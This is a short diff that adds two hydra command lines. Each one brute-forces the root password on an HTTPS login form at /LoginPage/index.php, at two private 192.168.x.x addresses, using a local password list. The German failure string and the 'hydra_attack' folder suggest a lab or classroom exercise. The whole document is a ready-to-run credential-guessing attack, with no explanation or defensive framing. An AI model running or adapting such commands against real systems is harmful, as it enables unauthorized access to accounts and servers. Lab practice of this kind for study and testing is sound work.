@@ -1,0 +1,2 @@
+hydra -l root -P /home/htl/Desktop/hydra_attack/passwords.txt 192.168.211.129 https-post-form "/LoginPage/index.php:user=root&passw=^PASS^:Falsches Passwort" -Vv -f
+hydra -l root -P /home/htl/Desktop/hydra_attack/passwords.txt 192.168.136.132 https-post-form "/LoginPage/index.php:user=root&passw=^PASS^:Falsches Passwort" -Vv -f
